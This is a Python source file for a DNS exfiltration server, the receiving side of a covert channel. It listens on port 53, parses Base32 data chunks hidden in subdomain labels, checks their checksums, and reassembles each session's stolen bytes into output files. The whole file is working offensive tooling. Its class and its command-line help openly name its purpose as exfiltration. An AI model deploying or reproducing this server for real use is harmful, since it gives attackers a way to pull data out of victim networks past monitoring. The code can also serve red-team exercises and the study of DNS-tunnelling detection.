#!/usr/bin/env python3

import argparse
import binascii
import os
import time
from collections import deque
from datetime import datetime
from typing import Dict, Optional

from colorama import Fore, Style, init
from dnslib import A, QTYPE, RR
from dnslib.server import DNSLogger, DNSServer, BaseResolver

from encoding_utils import (
    decode_base32_no_padding,
    validate_checksum,
    is_valid_base32,
)
from config import ServerConfig, default_config

init(autoreset=True)


class CustomDNSLogger(DNSLogger):
    """Simple colored console logger for incoming DNS queries."""

    def __init__(self, quiet: bool = False) -> None:
        super().__init__()
        self.processed_queries = set()
        self.quiet = quiet

    def log_request(self, handler, request) -> None:  # type: ignore[override]
        if self.quiet:
            return
        query_name = str(request.q.qname)
        if query_name not in self.processed_queries:
            print(
                f"{Style.BRIGHT}{Fore.GREEN}[+] "
                f"{Style.BRIGHT}{Fore.CYAN}Received DNS query for: "
                f"{Fore.YELLOW}{query_name}"
            )
            self.processed_queries.add(query_name)

    def log_reply(self, handler, reply) -> None:  # type: ignore[override]
        # We keep responses minimal and do not spam the console.
        return


class ExfiltrationResolver(BaseResolver):
    """
    Resolver that reconstructs exfiltrated data from DNS queries.

    The client sends queries in the form:

        <session>-<seq>-<chunk>-<checksum>.<domain>

    where:
    - <session> is a Base32 session ID
    - <seq> is a zero-padded sequence number
    - <chunk> is Base32-encoded data
    - <checksum> is a Base32 checksum

    We collect chunks by session ID, validate checksums, reconstruct the Base32
    stream in order, decode it to bytes, and write the result to files.
    """

    def __init__(
        self, output_dir: str, config: Optional[ServerConfig] = None, quiet: bool = False
    ) -> None:
        super().__init__()
        self.config = config or default_config
        self.data_chunks: Dict[str, Dict[str, str]] = {}
        self.output_dir = output_dir
        self.expected_total_chunks: Dict[str, int] = {}
        self.session_first_seen: Dict[str, float] = {}
        self.session_last_activity: Dict[str, float] = {}
        self.quiet = quiet
        self._rate_limit_timestamps: deque = deque()

        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

    def _evict_oldest_sessions(self, current_session_id: Optional[str] = None) -> None:
        """Evict oldest sessions by first_seen until under limits. Never evict current_session_id."""
        total_chunks = sum(len(c) for c in self.data_chunks.values())
        candidates = [s for s in self.data_chunks if s != current_session_id]
        while (
            (len(self.data_chunks) >= self.config.max_sessions or total_chunks > self.config.max_total_chunks)
            and candidates
        ):
            oldest_id = min(candidates, key=lambda sid: self.session_first_seen.get(sid, 0.0))
            self.try_write_to_file(oldest_id)
            self.data_chunks.pop(oldest_id, None)
            self.expected_total_chunks.pop(oldest_id, None)
            self.session_first_seen.pop(oldest_id, None)
            self.session_last_activity.pop(oldest_id, None)
            candidates.remove(oldest_id)
            total_chunks = sum(len(c) for c in self.data_chunks.values())

    def _expire_idle_sessions(self) -> None:
        """Expire sessions idle longer than chunk_timeout."""
        now = time.time()
        for sid in list(self.session_last_activity.keys()):
            if now - self.session_last_activity.get(sid, 0) > self.config.chunk_timeout:
                self.try_write_to_file(sid)
                self.data_chunks.pop(sid, None)
                self.expected_total_chunks.pop(sid, None)
                self.session_first_seen.pop(sid, None)
                self.session_last_activity.pop(sid, None)

    def resolve(self, request, handler):  # type: ignore[override]
        query_name = str(request.q.qname)

        try:
            # Optional global rate limit
            if self.config.server_rate_limit is not None:
                now = time.time()
                while self._rate_limit_timestamps and self._rate_limit_timestamps[0] < now - 60:
                    self._rate_limit_timestamps.popleft()
                if len(self._rate_limit_timestamps) >= self.config.server_rate_limit:
                    reply = request.reply()
                    reply.header.rcode = 3
                    return reply
                self._rate_limit_timestamps.append(now)

            # Extract the left-most label
            subdomain = query_name.split(".", 1)[0]
            if len(subdomain) > 63:
                raise ValueError("Label exceeds 63 characters")

            parts = subdomain.split("-")

            # DONE control: <session>-DONE-<total_chunks>
            if len(parts) == 3 and parts[1] == "DONE" and parts[2].isdigit() and len(parts[2]) == 4:
                session_id = parts[0]
                if not is_valid_base32(session_id):
                    raise ValueError(f"Invalid session ID in DONE: {session_id!r}")
                total = int(parts[2])
                self.expected_total_chunks[session_id] = total
                self.session_last_activity[session_id] = time.time()
                self.try_write_to_file(session_id)
                reply = request.reply()
                reply.add_answer(
                    RR(query_name, QTYPE.A, rdata=A("0.0.0.0"), ttl=60)  # type: ignore[arg-type]
                )
                return reply

            # Data: <session>-<seq>-<chunk>-<checksum>
            if len(parts) != 4:
                raise ValueError(
                    f"Malformed label: expected <session>-<seq>-<chunk>-<checksum> or <session>-DONE-<total>, "
                    f"got {len(parts)} parts"
                )

            session_id, seq_str, chunk_data, checksum = parts

            self._expire_idle_sessions()
            self.session_last_activity[session_id] = time.time()
            if session_id not in self.session_first_seen:
                self.session_first_seen[session_id] = time.time()
            self._evict_oldest_sessions(current_session_id=session_id)

            # Validate session ID (Base32, typically 6 chars)
            if not is_valid_base32(session_id):
                raise ValueError(f"Invalid session ID format: {session_id!r}")

            # Validate sequence number (4 digits)
            if not (len(seq_str) == 4 and seq_str.isdigit()):
                raise ValueError(f"Invalid sequence format: {seq_str!r} (expected 4 digits)")

            # Validate chunk data (Base32)
            if not is_valid_base32(chunk_data):
                raise ValueError(f"Invalid chunk data format (not Base32): {chunk_data[:20]}...")

            # Validate checksum (Base32, typically 3 chars)
            if not is_valid_base32(checksum):
                raise ValueError(f"Invalid checksum format: {checksum!r}")

            # Validate checksum before storing
            if not validate_checksum(chunk_data, checksum):
                print(
                    f"{Fore.RED}{Style.BRIGHT}[-] "
                    f"Checksum validation failed for session {session_id}, chunk {seq_str}"
                )
                reply = request.reply()
                reply.header.rcode = 3  # NXDOMAIN to indicate failure
                return reply

            # Initialize session storage if needed
            if session_id not in self.data_chunks:
                self.data_chunks[session_id] = {}

            # Store the chunk data
            self.data_chunks[session_id][seq_str] = chunk_data

            # Log chunk reception (unless quiet)
            if not self.quiet:
                chunk_count = len(self.data_chunks[session_id])
                print(
                    f"{Style.BRIGHT}{Fore.GREEN}[+] "
                    f"{Style.BRIGHT}{Fore.CYAN}Received chunk {seq_str} from session {session_id}: "
                    f"{Fore.YELLOW}{len(chunk_data)} chars (total: {chunk_count} chunks)"
                )

            # Try to write to file after each chunk.
            self.try_write_to_file(session_id)

            reply = request.reply()
            # Minimal dummy A record indicating the query was handled.
            reply.add_answer(
                RR(query_name, QTYPE.A, rdata=A("0.0.0.0"), ttl=60)  # type: ignore[arg-type]
            )
            return reply

        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process query: {e}")
            reply = request.reply()
            # NXDOMAIN to indicate failure to the client (which tolerates this).
            reply.header.rcode = 3
            return reply

    def try_write_to_file(self, session_id: str) -> None:
        """
        Try to write the current data for a session to file as binary.
        
        Args:
            session_id: Session ID to write data for
        """
        try:
            if session_id not in self.data_chunks:
                return

            session_chunks = self.data_chunks[session_id]
            if not session_chunks:
                return

            # Get all available chunks in order (0000, 0001, 0002, ...).
            available_chunks = []
            i = 0
            while str(i).zfill(4) in session_chunks:
                available_chunks.append(session_chunks[str(i).zfill(4)])
                i += 1

            if not available_chunks:
                return

            # Combine the Base32 chunks into a single string.
            combined_data = "".join(available_chunks)

            # Validate Base32 string format
            if not is_valid_base32(combined_data):
                raise ValueError("Combined data contains invalid Base32 characters")

            # RFC 4648: valid Base32 unpadded length mod 8 is only 0, 2, 4, 5, 7.
            if len(combined_data) % 8 not in (0, 2, 4, 5, 7):
                return

            # When DONE was received, only write when we have exactly expected chunks.
            expected = self.expected_total_chunks.get(session_id)
            if expected is not None and len(available_chunks) != expected:
                return

            try:
                # Decode Base32 (handles padding; only called when length is valid)
                decoded_bytes = decode_base32_no_padding(combined_data)
                
                # Write to file named by session ID and timestamp
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = os.path.join(self.output_dir, f"{session_id}_{timestamp}.bin")
                with open(output_file, "wb") as f:
                    f.write(decoded_bytes)
                    f.flush()
                
                chunk_count = len(available_chunks)
                print(
                    f"{Style.BRIGHT}{Fore.GREEN}[+] "
                    f"{Style.BRIGHT}{Fore.GREEN}Data written to {output_file} "
                    f"Session {session_id}: {chunk_count}/{chunk_count} chunks, {len(decoded_bytes)} bytes"
                )
            except binascii.Error as e:
                print(
                    f"{Fore.RED}{Style.BRIGHT}[-] Failed to decode Base32 data for session {session_id}: {e}\n"
                    f"  Combined length: {len(combined_data)}, "
                    f"Chunks: {len(available_chunks)}"
                )
            except Exception as e:
                print(
                    f"{Fore.RED}{Style.BRIGHT}[-] Failed to write data for session {session_id}: {e}\n"
                    f"  Combined length: {len(combined_data)}, "
                    f"Chunks: {len(available_chunks)}"
                )
        except Exception as e:
            print(
                f"{Fore.RED}{Style.BRIGHT}[-] Failed to process chunks for session {session_id}: {e}\n"
                f"  Available chunks: {len(self.data_chunks.get(session_id, {}))}"
            )

    def save_all_sessions(self) -> None:
        """Final save attempt for all sessions when server is shutting down."""
        for session_id in list(self.data_chunks.keys()):
            self.try_write_to_file(session_id)


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration server.")
    parser.add_argument(
        "-o",
        "--output-dir",
        default="output",
        help="Path to the output directory (default: 'output'). Files are named by session ID.",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="Server listening port. Default is 53.",
    )
    parser.add_argument(
        "-c",
        "--config",
        help="Path to configuration file.",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Suppress per-chunk and per-query logs; keep errors and Data written.",
    )
    return parser.parse_args()


def init_server(
    port: int,
    logger,
    output_dir: str,
    config: Optional[ServerConfig] = None,
    quiet: bool = False,
):
    """Initialize and start the DNS server."""
    resolver = ExfiltrationResolver(output_dir, config=config, quiet=quiet)
    server = DNSServer(resolver, port=port, address="0.0.0.0", logger=logger)
    server.start_thread()
    return server, resolver


if __name__ == "__main__":
    try:
        args = parse_args()
        from config import load_config
        config = load_config(getattr(args, "config", None))
        logger = CustomDNSLogger(quiet=getattr(args, "quiet", False))
        server, resolver = init_server(
            args.port, logger, args.output_dir, config=config, quiet=getattr(args, "quiet", False)
        )

        print(f"{Fore.GREEN}{Style.BRIGHT}[+] DNS Server started...")
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] Output directory: {args.output_dir}")
        # Avoid busy-waiting and keep CPU usage low while the server thread runs.
        while server.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}\n[+] Saving all received data...")
        resolver.save_all_sessions()
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[-] Error: {e}")
        exit(1)